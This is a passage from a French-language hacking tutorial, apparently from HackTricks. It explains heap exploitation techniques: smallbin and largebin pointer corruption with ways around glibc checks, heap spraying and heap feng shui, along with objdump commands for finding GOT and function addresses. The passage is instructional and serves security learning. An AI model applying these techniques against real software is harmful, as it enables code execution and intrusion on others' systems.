Une fois dans son bin, c'est le moment de modifier son pointeur bk par le d√©bordement pour qu'il pointe vers l'adresse que nous voulons √©craser.

Ainsi, le bin devra attendre son tour pour que malloc() soit appel√© suffisamment de fois pour que le bin modifi√© soit r√©utilis√© et trompe bin en lui faisant croire que le prochain bloc est √† l'adresse fausse. Et ensuite, le bloc qui nous int√©resse sera donn√©.

Pour que la vuln√©rabilit√© s'ex√©cute le plus t√¥t possible, l'id√©al serait : R√©servation du bloc vuln√©rable, r√©servation du bloc qui sera modifi√©, lib√©ration de ce bloc, r√©servation d'un bloc plus grand que celui qui sera modifi√©, modification du bloc (vuln√©rabilit√©), r√©servation d'un bloc de taille √©gale √† celui vuln√©r√© et r√©servation d'un second bloc de taille √©gale et ce sera celui qui pointera vers l'adresse choisie.

Pour prot√©ger cette attaque, on utilise la v√©rification typique que le bloc ‚Äún'est pas‚Äù faux : on v√©rifie si bck->fd pointe vers victim. C'est-√†-dire, dans notre cas, si le pointeur fd\* du bloc faux point√© dans la pile pointe vers victim. Pour contourner cette protection, l'attaquant devrait √™tre capable d'√©crire d'une mani√®re ou d'une autre (probablement par la pile) √† l'adresse appropri√©e l'adresse de victim. Pour que cela semble un bloc vrai.

**Corruption LargeBin**

Les m√™mes exigences que pr√©c√©demment sont n√©cessaires, ainsi que quelques autres, de plus, les blocs r√©serv√©s doivent √™tre sup√©rieurs √† 512.

L'attaque est comme la pr√©c√©dente, c'est-√†-dire, il faut modifier le pointeur bk et toutes ces appels √† malloc() sont n√©cessaires, mais en plus, il faut modifier la taille du bloc modifi√© de mani√®re √† ce que cette taille - nb soit < MINSIZE.

Par exemple, cela fera que mettre dans la taille 1552 pour que 1552 - 1544 = 8 < MINSIZE (la soustraction ne peut pas √™tre n√©gative car on compare un unsigned).

De plus, un patch a √©t√© introduit pour rendre cela encore plus compliqu√©.

**Heap Spraying**

Cela consiste essentiellement √† r√©server toute la m√©moire possible pour les tas et √† les remplir avec un matelas de nops suivi d'une shellcode. De plus, comme matelas, on utilise 0x0c. On essaiera de sauter √† l'adresse 0x0c0c0c0c, et ainsi, si une adresse √† laquelle on va appeler est √©cras√©e avec ce matelas, on sautera l√†. Essentiellement, la tactique consiste √† r√©server le maximum possible pour voir si un pointeur est √©cras√© et sauter √† 0x0c0c0c0c en esp√©rant qu'il y ait des nops l√†.

**Heap Feng Shui**

Cela consiste √† semer la m√©moire par le biais de r√©servations et de lib√©rations de mani√®re √† ce que des blocs r√©serv√©s se trouvent entre des blocs libres. Le buffer √† d√©border sera situ√© dans l'un des ≈ìufs.

**objdump -d ex√©cutable** ‚Äî> Disas functions\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obtenir l'adresse de la fonction\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour voir que c'est effectivement notre shellcode et obtenir les OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Table des symboles, pour obtenir l'adresse des variables et des fonctions\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Pour obtenir l'adresse des fonctions de biblioth√®ques (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtient l'adresse de puts √† √©craser dans la GOT\
**objdump -D ./exec** ‚Äî> Disas TOUT jusqu'aux entr√©es de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la fonction dans gdb

## Cours int√©ressants

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **R√©f√©rences**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
